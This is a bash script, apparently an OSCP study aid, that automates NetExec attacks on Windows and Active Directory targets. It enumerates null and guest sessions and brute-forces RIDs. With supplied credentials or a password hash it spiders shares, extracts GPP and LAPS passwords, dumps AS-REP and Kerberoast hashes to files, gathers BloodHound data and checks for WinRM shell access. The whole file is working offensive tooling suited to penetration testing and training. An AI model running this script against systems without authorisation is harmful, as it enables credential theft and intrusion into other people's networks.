#!/bin/bash

# auto-nxc.sh V3 - The Ultimate OSCP NetExec Automator
# Usage (No Creds): ./auto-nxc.sh -t <target_IP_or_file>
# Usage (Creds):    ./auto-nxc.sh -t <target_IP_or_file> -u <user> -p <pass>
# Usage (Hash):     ./auto-nxc.sh -t <target_IP_or_file> -u <user> -H <hash>

TARGET=""
USER=""
PASS=""
HASH=""

while getopts "t:u:p:H:" opt; do
  case $opt in
    t) TARGET="$OPTARG" ;;
    u) USER="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    H) HASH="$OPTARG" ;;
    *) echo "Invalid flag"; exit 1 ;;
  esac
done

if [ -z "$TARGET" ]; then
    echo -e "\n[!] Error: Target is required."
    echo -e "Usage: $0 -t 192.168.1.0/24 [-u user] [-p pass | -H hash]\n"
    exit 1
fi

# --- Output Directory Setup ---
OUTDIR="nxc_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"
echo -e "[*] Saving all output to: $OUTDIR\n"

# --- Safe Auth Array (fixes eval bug) ---
AUTH=()
if [ -n "$USER" ] && [ -n "$PASS" ]; then
    AUTH=(-u "$USER" -p "$PASS")
elif [ -n "$USER" ] && [ -n "$HASH" ]; then
    AUTH=(-u "$USER" -H "$HASH")
fi

# --- Helper: run command, log output, handle errors ---
run() {
    local label="$1"
    shift
    echo -e "\n[*] $label..."
    echo -e "\n[CMD] $*" | tee -a "$OUTDIR/full_log.txt"
    "$@" 2>&1 | tee -a "$OUTDIR/full_log.txt" || echo -e "[!] Command failed or returned no results: $label"
}

echo -e "\n======================================================="
echo -e "          OSCP NXC OMNI-ENUMERATOR (VERSION 3)         "
echo -e "=======================================================\n"

#####################################################################
# MODE 1: UNAUTHENTICATED / NULL SESSION
#####################################################################
if [ -z "$USER" ]; then
    echo -e "[!] MODE: UNAUTHENTICATED / NULL SESSION\n"

    run "SMB: Initial Target Sweep (OS, Domain, SMB Signing)" \
        nxc smb "$TARGET" | tee "$OUTDIR/smb_sweep.txt"

    run "SMB: Null Session - Shares" \
        nxc smb "$TARGET" -u '' -p '' --shares | tee "$OUTDIR/smb_null_shares.txt"

    run "SMB: Null Session - Users" \
        nxc smb "$TARGET" -u '' -p '' --users | tee "$OUTDIR/smb_null_users.txt"

    run "SMB: Null Session - Password Policy" \
        nxc smb "$TARGET" -u '' -p '' --pass-pol | tee "$OUTDIR/smb_null_passpol.txt"

    run "SMB: Guest Account - Shares & Users" \
        nxc smb "$TARGET" -u 'guest' -p '' --shares --users | tee "$OUTDIR/smb_guest.txt"

    run "SMB: RID Cycling via Guest" \
        nxc smb "$TARGET" -u 'guest' -p '' --rid-brute | tee "$OUTDIR/smb_rid_brute.txt"

    run "LDAP: Anonymous Bind" \
        nxc ldap "$TARGET" -u '' -p '' | tee "$OUTDIR/ldap_anon.txt"

    run "RPC: Anonymous Enumeration" \
        nxc rpc "$TARGET" -u '' -p '' --enum | tee "$OUTDIR/rpc_anon.txt"

    run "FTP: Anonymous Login" \
        nxc ftp "$TARGET" -u 'anonymous' -p 'anonymous' | tee "$OUTDIR/ftp_anon.txt"

    run "NFS: Enumeration" \
        nxc nfs "$TARGET" | tee "$OUTDIR/nfs_enum.txt"

#####################################################################
# MODE 2: AUTHENTICATED (VALID CREDENTIALS)
#####################################################################
else
    echo -e "[!] MODE: AUTHENTICATED ENUMERATION\n"
    echo -e "[+] Using Credentials -> User: $USER\n"

    # --- SMB ---
    run "SMB: Share Hunting & Local Admin (Pwn3d!) Check" \
        nxc smb "$TARGET" "${AUTH[@]}" --shares | tee "$OUTDIR/smb_shares.txt"

    run "SMB: Local Auth - Share Hunting (Workgroup/Non-Domain)" \
        nxc smb "$TARGET" "${AUTH[@]}" --local-auth --shares | tee "$OUTDIR/smb_local_auth_shares.txt"

    run "SMB: Logged-on Users & Active Sessions" \
        nxc smb "$TARGET" "${AUTH[@]}" --sessions --loggedon-users | tee "$OUTDIR/smb_sessions.txt"

    run "SMB: SpiderPlus (Mapping all readable files)" \
        nxc smb "$TARGET" "${AUTH[@]}" -M spider_plus -o OUTPUT_FOLDER="$OUTDIR/spider_plus" | tee "$OUTDIR/smb_spider.txt"

    run "SMB: GPP Passwords (SYSVOL hunting)" \
        nxc smb "$TARGET" "${AUTH[@]}" -M gpp_password | tee "$OUTDIR/smb_gpp_pass.txt"

    run "SMB: GPP AutoLogin" \
        nxc smb "$TARGET" "${AUTH[@]}" -M gpp_autologin | tee "$OUTDIR/smb_gpp_autologin.txt"

    # --- WinRM ---
    run "WinRM: Checking for Remote Shell Access (Port 5985)" \
        nxc winrm "$TARGET" "${AUTH[@]}" | tee "$OUTDIR/winrm.txt"

    # --- LDAP ---
    run "LDAP: BloodHound Ingestion (Full Domain Map)" \
        nxc ldap "$TARGET" "${AUTH[@]}" --bloodhound -c All | tee "$OUTDIR/ldap_bloodhound.txt"

    run "LDAP: Highly Privileged Users (AdminCount=1)" \
        nxc ldap "$TARGET" "${AUTH[@]}" --admin-count | tee "$OUTDIR/ldap_admin_count.txt"

    run "LDAP: Machine Account Quota (MAQ)" \
        nxc ldap "$TARGET" "${AUTH[@]}" -M maq | tee "$OUTDIR/ldap_maq.txt"

    run "LDAP: LAPS Passwords" \
        nxc ldap "$TARGET" "${AUTH[@]}" -M laps | tee "$OUTDIR/ldap_laps.txt"

    run "LDAP: AS-REP Roastable Users" \
        nxc ldap "$TARGET" "${AUTH[@]}" --asreproast "$OUTDIR/asrep_hashes.txt" | tee "$OUTDIR/ldap_asreproast.txt"

    run "LDAP: Kerberoastable Service Accounts" \
        nxc ldap "$TARGET" "${AUTH[@]}" --kerberoasting "$OUTDIR/kerb_hashes.txt" | tee "$OUTDIR/ldap_kerberoast.txt"

    run "LDAP: Mining User Descriptions for Passwords" \
        nxc ldap "$TARGET" "${AUTH[@]}" -M get-desc-users | tee "$OUTDIR/ldap_desc_users.txt"

    run "LDAP: Unconstrained & Constrained Delegation" \
        nxc ldap "$TARGET" "${AUTH[@]}" --trusted-for-delegation | tee "$OUTDIR/ldap_delegation.txt"

    run "LDAP: DACL / ACL Abuse Paths" \
        nxc ldap "$TARGET" "${AUTH[@]}" -M daclread | tee "$OUTDIR/ldap_dacl.txt"

    # --- MSSQL ---
    run "MSSQL: Database Access & Version Check" \
        nxc mssql "$TARGET" "${AUTH[@]}" -q "SELECT @@version" | tee "$OUTDIR/mssql.txt"

    # --- NFS ---
    run "NFS: Share Enumeration" \
        nxc nfs "$TARGET" | tee "$OUTDIR/nfs_enum.txt"

    echo -e "\n[+] ======= SUMMARY ======="
    echo -e "[+] All results saved to:   ./$OUTDIR/"
    echo -e "[+] BloodHound JSONs:        ./$OUTDIR/ (import to BloodHound)"
    echo -e "[+] SpiderPlus file map:     ./$OUTDIR/spider_plus/"
    echo -e "[+] AS-REP hashes:           ./$OUTDIR/asrep_hashes.txt"
    echo -e "[+] Kerberoast hashes:       ./$OUTDIR/kerb_hashes.txt"
    echo -e "[+] Full log:                ./$OUTDIR/full_log.txt"
fi

echo -e "=======================================================\n"
